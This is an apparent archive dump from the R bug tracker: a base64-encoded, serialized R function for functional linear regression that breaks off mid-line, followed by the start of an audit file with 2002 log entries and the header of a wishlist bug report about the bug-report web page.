AAQJAAAARyMgIFhMRkQgICAgLi4uIEZvciB0aGUgaW5kZXBlbmRlbnQgdmFyaWFibGUs
IHRoZSBvcmRlciBkZXJpdmF0aXZlIHRvIGJlAAAECQAAACojICAgICAgICAgICAgICBw
ZW5hbGl6ZWQgaWYgYW4gaW50ZWdlciwgb3IAAAQJAAAASiMgICAgICAgICAgICAgIGEg
bGluZWFyIGRpZmZlcmVudGlhbCBvcGVyYXRvciBpZiBhIGZ1bmN0aW9uYWwgZGF0YSBv
YmplY3QuAAAECQAAAEUjICBZTEZEICAgIC4uLiBGb3IgdGhlIGRlcGVuZGVudCB2YXJp
YWJsZSwgdGhlIG9yZGVyIGRlcml2YXRpdmUgdG8gYmUAAAQJAAAAKiMgICAgICAgICAg
ICAgIHBlbmFsaXplZCBpZiBhbiBpbnRlZ2VyLCBvcgAABAkAAABKIyAgICAgICAgICAg
ICAgYSBsaW5lYXIgZGlmZmVyZW50aWFsIG9wZXJhdG9yIGlmIGEgZnVuY3Rpb25hbCBk
YXRhIG9iamVjdC4AAAQJAAAAQSMgIFhMQU1CREEgLi4uIGEgc21vb3RoaW5nIHBhcmFt
ZXRlciBmb3IgdGhlIGluZGVwZW5kZW50IHZhcmlhYmxlAAAECQAAAEEjICBZTEFNQkRB
IC4uLiBhIHNtb290aGluZyBwYXJhbWV0ZXIgZm9yIHRoZSAgIGRlcGVuZGVudCB2YXJp
YWJsZQAABAkAAABBIyAgWk1BVFJOSyAuLi4gYWN0dWFsIHJhbmsgb2YgaW5kZXBlbmRl
bnQgdmFyaWFibGUgbWF0cml4IGZvciB0aGUAAAQJAAAAMSMgICAgICAgICAgICAgIGZ1
bmN0aW9uYWwgRFYvbXVsdGl2YXJpYXRlIElWIGNhc2UAAAQJAAAAHiMgIFJldHVybnM6
ICBhIGxpc3QgY29udGFpbmluZwAABAkAAAAqIyAgQUxQSEEgIC4uLiBhIHZlY3RvciBv
ZiBpbnRlcmNlcHQgdmFsdWVzAAAECQAAAEIjICBSRUdGRCAgLi4uIGEgZnVuY3Rpb25h
bCBkYXRhIG9iamVjdCBmb3IgdGhlIHJlZ3Jlc3Npb24gZnVuY3Rpb24AAAQJAAAAHyMg
IExhc3QgbW9kaWZpZWQ6ICAgNCBKdWx5IDIwMDEAAAQJAAAARSMgICsrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKwAABAkAAAA5IyAgICAgICAgICAgICAgVGhlIG11bHRpdmFyaWF0ZSBJViBhbmQg
ZnVuY3Rpb25hbCBEViBjYXNlAAAECQAAAEUjICArKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysAAAQJAAAA
CAlDViA8LSAwAAAECQAAADQJaWYoaW5oZXJpdHMoeWZkLCAiZmQiKSAmJiAhKGluaGVy
aXRzKHhmZCwgImZkIikpKSB7AAAECQAAABYJCWlmKGlzLm1hdHJpeCh4ZmQpKSB7AAAE
CQAAABkJCQl6bWF0IDwtIGFzLm1hdHJpeCh4ZmQpAAAECQAAAAwJCQlmZCA8LSB5ZmQA
AAQJAAAAAwkJfQAABAkAAAAICQllbHNlIHsAAAQJAAAAMwkJCXN0b3AoIkZpcnN0IGFy
Z3VtZW50IG5vdCBhIHZlY3RvciBvciBhIG1hdHJpeC4iKQAABAkAAAADCQl9AAAECQAA
ABUJCWNvZWYgPC0gZ2V0Y29lZihmZCkAAAQJAAAAFAkJY29lZmQgPC0gZGltKGNvZWYp
AAAECQAAABcJCW5kaW0gPC0gbGVuZ3RoKGNvZWZkKQAABAkAAAAOCQlpZihuZGltIDwg
MikAAAQJAAAANwkJCXN0b3AoIkxpbmVhciBtb2RlbGluZyBpbXBvc3NpYmxlIHdpdGgg
MSByZXBsaWNhdGlvbiIAAAQJAAAABQkJCQkpAAAECQAAABQJCW5yZXAgPC0gbnJvdyh6
bWF0KQAABAkAAAAPCQlpZihuZGltID09IDMpAAAECQAAABMJCQludmFyIDwtIGNvZWZk
WzNdAAAECQAAABAJCWVsc2UgbnZhciA8LSAxAAAECQAAABkJCWJhc2lzZmQgPC0gZ2V0
YmFzaXMoZmQpAAAECQAAABoJCW5iYXNpcyA8LSBiYXNpc2ZkJG5iYXNpcwAABAkAAAAZ
CQlyYW5nZXd0IDwtIHJhbmdlKHd0dmVjKQAABAkAAAAUCQlpZihyYW5nZXd0WzFdIDwg
MCkAAAQJAAAAMgkJCXN0b3AoIldUVkVDIG11c3Qgbm90IGNvbnRhaW4gbmVnYXRpdmUg
dmFsdWVzLiIpAAAECQAAAB4JCWlmKHJhbmdld3RbMV0gPT0gcmFuZ2V3dFsyXSkAAAQJ
AAAADQkJCXd0dmFyIDwtIEYAAAQJAAAAEQkJZWxzZSB3dHZhciA8LSBUAAAECQAAABsJ
CWlmKGxlbmd0aCh3dHZlYykgIT0gbnJlcCkAAAQJAAAAIAkJCXN0b3AoIldUVkVDIG9m
IHdyb25nIGxlbmd0aCIpAAAECQAAABUJCWlmKG1pbih3dHZlYykgPD0gMCkAAAQJAAAA
MAkJCXN0b3AoIkFsbCB2YWx1ZXMgb2YgV1RWRUMgbXVzdCBiZSBwb3NpdGl2ZS4iKQAA
BAkAAAARCQlpZih5bGFtYmRhIDwgMCkAAAQJAAAAPgkJCXdhcm5pbmcoIlZhbHVlIG9m
IExBTUJEQSB3YXMgbmVnYXRpdmUsIGFuZCAwIHVzZWQgaW5zdGVhZC4iAAAECQAAAAUJ
CQkJKQAABAkAAAAdCQlpZih5bGFtYmRhID4gMCAmJiB5TGZkIDwgMCkAAAQJAAAAMwkJ
CXN0b3AoIk9yZGVyIG9mIGRlcml2YXRpdmUgbXVzdCBiZSBub25uZWdhdGl2ZS4iKQAA
BAkAAAAaCQlpZihkaW0oY29lZilbMl0gIT0gbnJlcCkAAAQJAAAAQgkJCXN0b3AoIk51
bWJlciBvZiByb3dzIG9mIFpNQVQgbXVzdCBlcXVhbCBudW1iZXIgb2YgcmVwbGljYXRp
b25zIgAABAkAAAAFCQkJCSkAAAQJAAAAEQkJcCA8LSBuY29sKHptYXQpAAAECQAAABAJ
CWlmKG52YXIgPiAxKSB7AAAECQAAACgJCQliY29lZiA8LSBhcnJheSgwLCBjKG5iYXNp
cywgcCwgbnZhcikpAAAECQAAAAMJCX0AAAQJAAAACAkJZWxzZSB7AAAECQAAACAJCQli
Y29lZiA8LSBtYXRyaXgoMCwgbmJhc2lzLCBwKQAABAkAAAADCQl9AAAECQAAABEJCWlm
KHptYXRybmsgPiBwKQAABAkAAABGCQkJc3RvcCgiU3BlY2lmaWVkIHJhbmsgb2YgWk1B
VCBtdXN0IG5vdCBiZSBncmVhdGVyIHRoYW4gbm8uIGNvbHVtbnMuIgAABAkAAAAFCQkJ
CSkAAAQJAAAAEwkJaWYoem1hdHJuayA8IHApIHsAAAQJAAAAFwkJCXJvb3R3IDwtIHNx
cnQod3R2ZWMpAAAECQAAAC0JCQl6bWF0c3ZkIDwtIHN2ZChzd2VlcCh6bWF0LCAyLCBy
b290dywgIioiKSkAAAQJAAAAFQkJCXptYXRkIDwtIHptYXRzdmQkZAAABAkAAAAaCQkJ
aWYoem1hdGRbem1hdHJua10gPD0gMCkAAAQJAAAACQkJCQlzdG9wKAAABAkAAAAsCQkJ
CSAgIlpNQVQgaXMgbm90IG9mIHNwZWNpZmllZCBjb2x1bW4gcmFuayIAAAQJAAAABwkJ
CQkgICkAAAQJAAAAFQkJCWluZGV4IDwtIDE6em1hdHJuawAABAkAAAAwCQkJemdpbnZ0
IDwtIHN3ZWVwKHptYXRzdmQkdVssIGluZGV4XSwgMSwgem1hdGRbAAAECQAAACoJCQkJ
aW5kZXhdLCAiLyIpICUqJSB0KHptYXRzdmQkdlssIGluZGV4XSkAAAQJAAAAEgkJCWlm
KG52YXIgPT0gMSkgewAABAkAAAAsCQkJCWJjb2VmIDwtIHN3ZWVwKGNvZWYsIDEsIHJv
b3R3LCAiKiIpICUqJSAAAAQJAAAADAkJCQkgIHpnaW52dAAABAkAAAAECQkJfQAABAkA
AAAJCQkJZWxzZSB7AAAECQAAABYJCQkJZm9yKGogaW4gMTpudmFyKSB7AAAECQAAAC0J
CQkJICBiY29lZlssICAsIGpdIDwtIHN3ZWVwKGNvZWZbLCAgLCBqXSwgMSwAAAQJAAAA
HgkJCQkgICAgcm9vdHcsICIqIikgJSolIHpnaW52dAAABAkAAAAFCQkJCX0AAAQJAAAA
BAkJCX0AAAQJAAAAAwkJfQAABAkAAAAICQllbHNlIHsAAAQJAAAAEgkJCWlmKG52YXIg
PT0gMSkgewAABAkAAAArCQkJCWJjb2VmIDwtIHQobHNmaXQoem1hdCwgdChjb2VmKSwg
d3R2ZWMsIAAABAkAAAAUCQkJCSAgaW50ID0gRikkY29lZikAAAQJAAAABAkJCX0AAAQJ
AAAACQkJCWVsc2UgewAABAkAAAAWCQkJCWZvcihqIGluIDE6bnZhcikgewAABAkAAAAt
CQkJCSAgYmNvZWZbLCAgLCBqXSA8LSB0KGxzZml0KHptYXQsIHQoY29lZlssAAAECQAA
ACQJCQkJICAgICwgal0pLCB3dHZlYywgaW50ID0gRikkY29lZikAAAQJAAAABQkJCQl9
AAAECQAAAAQJCQl9AAAECQAAAAMJCX0AAAQJAAAAHwkJeWhhdGNvZWYgPC0gYmNvZWYg
JSolIHQoem1hdCkAAAQJAAAAEAkJaWYobnZhciA+IDEpIHsAAAQJAAAAMgkJCWRpbW5h
bWVzKGJjb2VmKSA8LSBsaXN0KE5VTEwsIGRpbW5hbWVzKHptYXQpW1syAAAECQAAACAJ
CQkJXV0sIGRpbW5hbWVzKHlmZFtbMV1dKVtbM11dKQAABAkAAAADCQl9AAAECQAAAAgJ
CWVsc2UgewAABAkAAAAyCQkJZGltbmFtZXMoYmNvZWYpIDwtIGxpc3QoTlVMTCwgZGlt
bmFtZXMoem1hdClbWzIAAAQJAAAABwkJCQldXSkAAAQJAAAAAwkJfQAABAkAAAAZCQlm
ZG5hbWVzIDwtIGdldG5hbWVzKGZkKQAABAkAAAAXCQlyZWdmZG5hbWVzIDwtIGZkbmFt
ZXMAAAQJAAAALQkJcmVnZmRuYW1lc1tbMl1dIDwtIHBhc3RlKCJSZWcuIENvZWYuIiwg
MTpwKQAABAkAAAAhCQlyZWdmZG5hbWVzW1szXV0gPC0gIlJlZy4gQ29lZi4iAAAECQAA
AC0JCW5hbWVzKHJlZ2ZkbmFtZXMpWzJdIDwtICJSZWcuIENvZWZmaWNpZW50cyIAAAQJ
AAAAMAkJcmVnZmQgPC0gY3JlYXRlLmZkKGJjb2VmLCBiYXNpc2ZkLCByZWdmZG5hbWVz
KQAABAkAAAAxCQl5aGF0ZmQgPC0gY3JlYXRlLmZkKHloYXRjb2VmLCBiYXNpc2ZkLCBm
ZG5hbWVzKQAABAkAAAAmCQlsaW5tb2RsaXN0IDwtIGxpc3QoMCwgcmVnZmQsIHloYXRm
ZCkAAAQJAAAANAkJbmFtZXMobGlubW9kbGlzdCkgPC0gYygiYWxwaGEiLCAicmVnZmQi
LCAieWhhdGZkIikAAAQJAAAAFAkJcmV0dXJuKGxpbm1vZGxpc3QpAAAECQAAAAIJfQAA
BAkAAABFIyAgKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrAAAECQAAADgjICAgICAgICAgICAgIFRoZSBm
dW5jdGlvbmFsIElWIGFuZCBtdWx0aXZhcmlhdGUgRFYgY2FzZQAABAkAAABFIyAgKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrAAAECQAAAEUjdGhpcyBpcyB0aGUgY2FzZSBvZiBpbnRlcmVzdCAt
IG9idGFpbiB0aGUgQ1YobGFtYmRhKSBzY29yZSBzdGF0aXN0aWMAAAQJAAAAKiNhcyBp
biBzZWN0aW9uIDEwLjggb2YgUmFtc2F5ICAmIFNpbHZlcm1hbgAABAkAAAABIwAABAkA
AAA0CWlmKGluaGVyaXRzKHhmZCwgImZkIikgJiYgIShpbmhlcml0cyh5ZmQsICJmZCIp
KSkgewAABAkAAAAXCQlpZihpcy5udW1lcmljKHlmZCkpIHsAAAQJAAAAGQkJCXltYXQg
PC0gYXMubWF0cml4KHlmZCkAAAQJAAAADAkJCWZkIDwtIHhmZAAABAkAAAADCQl9AAAE
CQAAAAgJCWVsc2UgewAABAkAAAAOCQkJc3RvcChwYXN0ZSgAAAQJAAAAMwkJCQkiU2Vj
b25kIGFyZ3VtZW50IG5vdCBhIGZ1bmN0aW9uYWwgZGF0YSBvYmplY3QiLAAABAkAAAAb
CQkJCSIgYW5kIGlzIG5vdCBudW1lcmljIiwgAAAECQAAACoJCQkJIndoZW4gZmlyc3Qg
YXJndW1lbnQgaXMgZnVuY3Rpb25hbC4iKSkAAAQJAAAAAwkJfQAABAkAAAAVCQljb2Vm
IDwtIGdldGNvZWYoZmQpAAAECQAAABQJCWNvZWZkIDwtIGRpbShjb2VmKQAABAkAAAAX
CQluZGltIDwtIGxlbmd0aChjb2VmZCkAAAQJAAAADgkJaWYobmRpbSA8IDIpAAAECQAA
ADcJCQlzdG9wKCJMaW5lYXIgbW9kZWxpbmcgaW1wb3NzaWJsZSB3aXRoIDEgcmVwbGlj
YXRpb24iAAAECQAAAAUJCQkJKQAABAkAAAAcCQlpZihsZW5ndGgoZGltKGNvZWYpKSA9
PSAzKQAABAkAAABBCQkJc3RvcCgiVGhpcyB2ZXJzaW9uIGNhbm5vdCBhY2NvbW1vZGF0
ZSBtdWx0aXBsZSBmdW5jdGlvbmFsIElWcyIAAAQJAAAABQkJCQkpAAAECQAAABIJCW5y
ZXAgPC0gY29lZmRbMl0AAAQJAAAAFAkJbnZhciA8LSBuY29sKHltYXQpAAAECQAAABkJ
CXJhbmdld3QgPC0gcmFuZ2Uod3R2ZWMpAAAECQAAABQJCWlmKHJhbmdld3RbMV0gPCAw
KQAABAkAAAAyCQkJc3RvcCgiV1RWRUMgbXVzdCBub3QgY29udGFpbiBuZWdhdGl2ZSB2
YWx1ZXMuIikAAAQJAAAAHgkJaWYocmFuZ2V3dFsxXSA9PSByYW5nZXd0WzJdKQAABAkA
AAANCQkJd3R2YXIgPC0gRgAABAkAAAARCQllbHNlIHd0dmFyIDwtIFQAAAQJAAAAGQkJ
YmFzaXNmZCA8LSBnZXRiYXNpcyhmZCkAAAQJAAAAGgkJbmJhc2lzIDwtIGJhc2lzZmQk
bmJhc2lzAAAECQAAAB8JCXR5cGUgPC0gZ2V0YmFzaXN0eXBlKGJhc2lzZmQpAAAECQAA
ABgJCWlmKG5yb3coeW1hdCkgIT0gbnJlcCkAAAQJAAAAQgkJCXN0b3AoIk51bWJlciBv
ZiByb3dzIG9mIFlNQVQgbXVzdCBlcXVhbCBudW1iZXIgb2YgcmVwbGljYXRpb25zIgAA
BAkAAAAFCQkJCSkAAAQJAAAAFQkJb25lIDwtIHJlcCgxLCBucmVwKQAABAkAAAAbCQlp
ZihsZW5ndGgod3R2ZWMpICE9IG5yZXApAAAECQAAACAJCQlzdG9wKCJXVFZFQyBvZiB3
cm9uZyBsZW5ndGgiKQAABAkAAAARCQlpZih4bGFtYmRhIDwgMCkAAAQJAAAAPwkJCXdh
cm5pbmcoIlZhbHVlIG9mIFhMQU1CREEgd2FzIG5lZ2F0aXZlLCBhbmQgMCB1c2VkIGlu
c3RlYWQuIgAABAkAAAAFCQkJCSkAAAQJAAAAIgkJam1hdCA8LSBpbnByb2QoYmFzaXNm
ZCwgYmFzaXNmZCkAAAQJAAAAJgkJem1hdCA8LSB0KHJiaW5kKG9uZSwgam1hdCAlKiUg
Y29lZikpAAAECQAAACIJCWJjb2VmIDwtIG1hdHJpeCgwLCBuYmFzaXMsIG52YXIpAAAE
CQAAABcJCWFscGhhIDwtIHJlcCgwLCBudmFyKQAABAkAAAAZCQlpbmRleCA8LSAyOihu
YmFzaXMgKyAxKQAABAkAAAAgCQlpZih4bGFtYmRhIDw9IDAgJiYgeGVkZiA8IDIpIHsA
AAQJAAAAMyMgIG5vIHNtb290aGluZyByZXF1aXJlZCwgZG8gb3JkaW5hcnkgbGVhc3Qg
c3F1YXJlcwAABAkAAAAqCQkJaWYobmNvbCh6bWF0KSA+IG5yb3coem1hdCkpIHN0b3Ao
cGFzdGUoAAAECQAAADgJCQkJICAiRm9yIFhMQU1CREEgPSAwLCBuby4gb2YgYmFzaXMg
ZnVuY3Rpb25zIGV4Y2VlZHMiLAAABAkAAAAwCQkJCSAgIm51bWJlciBvZiByZXBsaWNh
dGlvbnMuIE5vIGZpdCBwb3NzaWJsZS4iAAAECQAAAAgJCQkJICApKQAABAkAAAADCQl9
AAAECQAAAA0JCWlmKHd0dmFyKSB7AAAECQAAACUJCQl0ZW1wIDwtIHN3ZWVwKHptYXQs
IDIsIHd0dmVjLCAiKiIpAAAECQAAACAJCQlDbWF0IDwtIGNyb3NzcHJvZCh0ZW1wLCB6
bWF0KQAABAkAAAAgCQkJRG1hdCA8LSBjcm9zc3Byb2QodGVtcCwgeW1hdCkAAAQJAAAA
AwkJfQAABAkAAAAICQllbHNlIHsAAAQJAAAAGgkJCUNtYXQgPC0gY3Jvc3Nwcm9kKHpt
YXQpAAAECQAAACAJCQlEbWF0IDwtIGNyb3NzcHJvZCh6bWF0LCB5bWF0KQAABAkAAAAD
CQl9AAAECQAAACAJCWlmKHhsYW1iZGEgPiAwIHx8IHhlZGYgPj0gMikgewAABAkAAAAV
IyAgc21vb3RoaW5nIHJlcXVpcmVkAAAECQAAACwJCQlrbWF0IDwtIG1hdHJpeCgwLCBu
YmFzaXMgKyAxLCBuYmFzaXMgKyAxKQAABAkAAAAyCQkJa21hdFtpbmRleCwgaW5kZXhd
IDwtIGlucHJvZChiYXNpc2ZkLCBiYXNpc2ZkLCAAAAQJAAAADgkJCXhMZmQsIHhMZmQp
AAAECQAAACAJCQlDbWF0IDwtIENtYXQgKyB4bGFtYmRhICoga21hdAAABAkAAAAAAAAE
CQAAADIJCQlTPC0gem1hdCAlKiUgc29sdmUoQ21hdCkgJSolIHQoem1hdCkjaGF0IG1h
dHJpeAAABAkAAAAiCQlFREYxIDwtIHN1bShkaWFnKFMpKQkjIHRyYWNlIChTKQAABAkA
AAAuCQlFREYyIDwtIHN1bShkaWFnKGNyb3NzcHJvZChTKSkpICN0cmFjZSAoU1MnKQAA
BAkAAAA8CQlFREYzIDwtIHN1bShkaWFnKDIgKiBTIC0gY3Jvc3Nwcm9kKFMpKSkgIyB0
cmFjZSAoMlMgLSBTJ1MpAAAECQAAACgJCXByaW50KCBwYXN0ZShwYXN0ZSgnRURGJywx
OjMsc2VwPScnKSwgAAAECQAAADUJCXJvdW5kKGMoRURGMSxFREYyLEVERjMpLDIpLHNl
cD0nPScsY29sbGFwc2U9JyAgICcpLAAABAkAAAALCQkJcXVvdGU9RikAAAQJAAAAAwkJ
fQAABAkAAAA0CQl0ZW1wIDwtIHN5bXNvbHZlKENtYXQsIERtYXQpCSMgY3NpIGluIGVx
IDEwLjE1IFImUwAABAkAAAACCQkAAAQJAAAAAAAABAkAAAAVI1MgaXMgdGhlIGhhdCBt
YXRyaXggAAAECQAAABsjdXNlIEJ1amEgZXQgYWwuJ3Mgbm90YXRpb24AAAQJAAAAASMA
AAQJAAAAAAAABAkAAAAQCQlTaWkgPC0gZGlhZyhTKQAABAkAAAAYCQl5aGF0IDwtIHpt
YXQgJSolIHRlbXAJAAAECQAAAAIJIwAABAkAAAAqCSN0aGlzIHdpbGwgb25seSB3b3Jr
IGlmIHlmZCBpcyBhIHZlY3RvcjsgAAAECQAAAAIJIwAABAkAAAAnCQlDViA8LSBzdW0o
KCh5ZmQgLSB5aGF0KS8oMSAtIFNpaSkpXjIpAAAECQAAACQJCWJjb2VmIDwtIGFzLm1h
dHJpeCh0ZW1wW2luZGV4LCAgXSkAAAQJAAAAFQkJYWxwaGEgPC0gdGVtcFsxLCAgXQAA
BAkAAAAaCQlmZG5hbWVzIDwtIGdldG5hbWVzKHhmZCkAAAQJAAAAFwkJcmVnZmRuYW1l
cyA8LSBmZG5hbWVzAAAECQAAADAJCXJlZ2ZkbmFtZXNbWzJdXSA8LSBwYXN0ZSgiUmVn
LiBDb2VmLiIsIDE6bnZhcikAAAQJAAAAIQkJcmVnZmRuYW1lc1tbM11dIDwtICJSZWcu
IENvZWYuIgAABAkAAAAtCQluYW1lcyhyZWdmZG5hbWVzKVsyXSA8LSAiUmVnLiBDb2Vm
ZmljaWVudHMiAAAECQAAADAJCXJlZ2ZkIDwtIGNyZWF0ZS5mZChiY29lZiwgYmFzaXNm
ZCwgcmVnZmRuYW1lcykAAAQJAAAAOQkJbGlubW9kbGlzdCA8LSBsaXN0KGFscGhhLCBy
ZWdmZCwgeWhhdCwgQ1YsIEVERjEsIEVERjIsIAAABAkAAAAICQkJRURGMykAAAQJAAAA
OQkJbmFtZXMobGlubW9kbGlzdCkgPC0gYygiYWxwaGEiLCAicmVnZmQiLCAieWhhdCIs
ICJDViIsIAAABAkAAAAaCQkJIkVERjEiLCAiRURGMiIsICJFREYzIikAAAQJAAAAFAkJ
cmV0dXJuKGxpbm1vZGxpc3QpAAAECQAAAAIJfQAABAkAAABFIyAgKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrAAAECQAAADYjICAgICAgICAgICAgIFRoZSBmdW5jdGlvbmFsIElWIGFuZCBmdW5j
dGlvbmFsIERWIGNhc2UAAAQJAAAARSMgICsrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKwAABAkAAAAxCWlm
KGluaGVyaXRzKHhmZCwgImZkIikgJiYgaW5oZXJpdHMoeWZkLCAiZmQiKSkgewAABAkA
AAAXCQljb2VmeCA8LSBnZXRjb2VmKHhmZCkAAAQJAAAAFwkJY29lZnkgPC0gZ2V0Y29l
Zih5ZmQpAAAECQAAABYJCWNvZWZkeCA8LSBkaW0oY29lZngpAAAECQAAABYJCWNvZWZk
eSA8LSBkaW0oY29lZnkpAAAECQAAABkJCW5kaW14IDwtIGxlbmd0aChjb2VmZHgpAAAE
CQAAABkJCW5kaW15IDwtIGxlbmd0aChjb2VmZHkpAAAECQAAAA8JCWlmKG5kaW14IDwg
MikAAAQJAAAANwkJCXN0b3AoIkxpbmVhciBtb2RlbGluZyBpbXBvc3NpYmxlIHdpdGgg
MSByZXBsaWNhdGlvbiIAAAQJAAAABQkJCQkpAAAECQAAABAJCWlmKG5kaW14ID09IDMp
AAAECQAAAEEJCQlzdG9wKCJUaGlzIHZlcnNpb24gY2Fubm90IGFjY29tbW9kYXRlIG11
bHRpcGxlIGZ1bmN0aW9uYWwgSVZzIgAABAkAAAAFCQkJCSkAAAQJAAAAEwkJbnJlcCA8
LSBjb2VmZHhbMl0AAAQJAAAAFwkJaWYoY29lZmR5WzJdICE9IG5yZXApAAAECQAAAEoJ
CQlzdG9wKCJOdW1iZXJzIG9mIG9ic2VydmF0aW9ucyBpbiB0aGUgZmlyc3QgdHdvIGFy
Z3VtZW50cyBkbyBub3QgbWF0Y2guIgAABAkAAAAFCQkJCSkAAAQJAAAAGQkJcmFuZ2V3
dCA8LSByYW5nZSh3dHZlYykAAAQJAAAAFAkJaWYocmFuZ2V3dFsxXSA8IDApAAAECQAA
ADIJCQlzdG9wKCJXVFZFQyBtdXN0IG5vdCBjb250YWluIG5lZ2F0aXZlIHZhbHVlcy4i
KQAABAkAAAAeCQlpZihyYW5nZXd0WzFdID09IHJhbmdld3RbMl0pAAAECQAAAA0JCQl3
dHZhciA8LSBGAAAECQAAABEJCWVsc2Ugd3R2YXIgPC0gVAAABAkAAAAbCQliYXNpc3hm
ZCA8LSBnZXRiYXNpcyh4ZmQpAAAECQAAABwJCW5iYXNpc3ggPC0gYmFzaXN4ZmQkbmJh
c2lzAAAECQAAABgJCXR5cGV4IDwtIGJhc2lzeGZkJHR5cGUAAAQJAAAAHgkJcmFuZ2V2
eCA8LSBiYXNpc3hmZCRyYW5nZXZhbAAABAkAAAAbCQliYXNpc3lmZCA8LSBnZXRiYXNp
cyh5ZmQpAAAECQAAABwJCW5iYXNpc3kgPC0gYmFzaXN5ZmQkbmJhc2lzAAAECQAAABgJ
CXR5cGV5IDwtIGJhc2lzeWZkJHR5cGUAAAQJAAAAHgkJcmFuZ2V2eSA8LSBiYXNpc3lm
ZCRyYW5nZXZhbAAABAkAAAAbCQlpZihsZW5ndGgod3R2ZWMpICE9IG5yZXApAAAECQAA
ACAJCQlzdG9wKCJXVFZFQyBvZiB3cm9uZyBsZW5ndGgiKQAABAkAAAAVCQlpZihtaW4o
d3R2ZWMpIDw9IDApAAAECQAAADAJCQlzdG9wKCJBbGwgdmFsdWVzIG9mIFdUVkVDIG11
c3QgYmUgcG9zaXRpdmUuIikAAAQJAAAAEQkJaWYoeGxhbWJkYSA8IDApAAAECQAAAD4J
CQl3YXJuaW5nKCJWYWx1ZSBvZiBMQU1CREEgd2FzIG5lZ2F0aXZlLCBhbmQgMCB1c2Vk
IGluc3RlYWQuIgAABAkAAAAFCQkJCSkAAAQJAAAAJQkJam1hdHggPC0gaW5wcm9kKGJh
c2lzeGZkLCBiYXNpc3hmZCkAAAQJAAAAMwkJcGVubWF0eCA8LSBpbnByb2QoYmFzaXN4
ZmQsIGJhc2lzeGZkLCB4TGZkLCB4TGZkKQAABAkAAAASCQlpZihuZGlteCA9PSAyKSB7
AAAECQAAADIJCQl6bWF0eCA8LSB0KHJiaW5kKG1hdHJpeCgxLCAxLCBucmVwKSwgam1h
dHggJSolIAAABAkAAAALCQkJCWNvZWZ4KSkAAAQJAAAAAwkJfQAABAkAAAAICQllbHNl
IHsAAAQJAAAAMgkJCXptYXR4IDwtIHQocmJpbmQobWF0cml4KDEsIDEsIG5yZXApLCBq
bWF0eCAlKiUgAAAECQAAABMJCQkJY29lZnhbLCAgLCAxXSkpAAAECQAAAAMJCX0AAAQJ
AAAAJQkJam1hdHkgPC0gaW5wcm9kKGJhc2lzeWZkLCBiYXNpc3lmZCkAAAQJAAAAMwkJ
cGVubWF0eSA8LSBpbnByb2QoYmFzaXN5ZmQsIGJhc2lzeWZkLCB5TGZkLCB5TGZkKQAA
BAkAAAAaCQlhbHBoYSA8LSByZXAoMCwgbmJhc2lzeSkAAAQJAAAAGgkJaW5kZXggPC0g
MjoobmJhc2lzeCArIDEpAAAECQAAAC4JCWttYXR4IDwtIG1hdHJpeCgwLCBuYmFzaXN4
ICsgMSwgbmJhc2lzeCArIDEpAAAECQAAACAJCWttYXR4W2luZGV4LCBpbmRleF0gPC0g
cGVubWF0eAAABAkAAAANCQlpZih3dHZhcikgewAABAkAAAAnCQkJem1hdHcgPC0gc3dl
ZXAoem1hdHgsIDIsIHd0bWF0LCAiKiIpAAAECQAAADUJCQl0ZW1weCA8LSBzb2x2ZShj
cm9zc3Byb2Qoem1hdHcsIHptYXR4KSArIHhsYW1iZGEgKgAABAkAAAAKCQkJCWttYXR4
KQAABAkAAAAsCQkJdGVtcHkgPC0gc29sdmUoam1hdHkgKyB5bGFtYmRhICogcGVubWF0
eSkAAAQJAAAAMwkJCWdtYXQgPC0gdGVtcHggJSolIGNyb3NzcHJvZCh6bWF0dywgdChj
b2VmeVssICAsIAAABAkAAAAcCQkJCTFdKSkgJSolIGptYXR5ICUqJSB0ZW1weQAABAkA
AAADCQl9AAAECQAAAAgJCWVsc2UgewAABAkAAAAvCQkJdGVtcHggPC0gc29sdmUoY3Jv
c3Nwcm9kKHptYXR4KSArIHhsYW1iZGEgKiAAAAQJAAAACgkJCQlrbWF0eCkAAAQJAAAA
LAkJCXRlbXB5IDwtIHNvbHZlKGptYXR5ICsgeWxhbWJkYSAqIHBlbm1hdHkpAAAECQAA
ABMJCQlpZihuZGlteSA9PSAyKSB7AAAECQAAACkJCQkJZ21hdCA8LSB0ZW1weCAlKiUg
Y3Jvc3Nwcm9kKHptYXR4LCB0KAAABAkAAAAhCQkJCSAgY29lZnkpKSAlKiUgam1hdHkg
JSolIHRlbXB5AAAECQAAAAQJCQl9AAAECQAAAAkJCQllbHNlIHsAAAQJAAAAKQkJCQln
bWF0IDwtIHRlbXB4ICUqJSBjcm9zc3Byb2Qoem1hdHgsIHQoAAAECQAAACkJCQkJICBj
b2VmeVssICAsIDFdKSkgJSolIGptYXR5ICUqJSB0ZW1weQAABAkAAAAECQkJfQAABAkA
AAADCQl9AAAECQAAAB8JCXloYXRjb2VmIDwtIHQoem1hdHggJSolIGdtYXQpAAAECQAA
ACYJCWJjb2VmIDwtIG1hdHJpeCgwLCBuYmFzaXN4LCBuYmFzaXN5KQAABAkAAAAZCQli
Y29lZiA8LSBnbWF0W2luZGV4LCAgXQAABAkAAAAgCQlhbHBoYSA8LSBhcy5tYXRyaXgo
Z21hdFsxLCAgXSkAAAQJAAAAGgkJZmRuYW1lcyA8LSBnZXRuYW1lcyh5ZmQpAAAECQAA
ABkJCWFscGhhZmRuYW1lcyA8LSBmZG5hbWVzAAAECQAAACIJCWFscGhhZmRuYW1lc1tb
Ml1dIDwtICJJbnRlcmNlcHQiAAAECQAAACcJCW5hbWVzKGFscGhhZmRuYW1lcylbMl0g

==> 1991.audit <==
Tue Sep 17 11:21:40 2002	maechler	foobar
Tue Sep 17 11:21:40 2002	maechler	moved from incoming to Macintosh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Misc

* PR# 1126 *
Subject: R-bug report www page whishlist
From: jens.lund@nordea.com
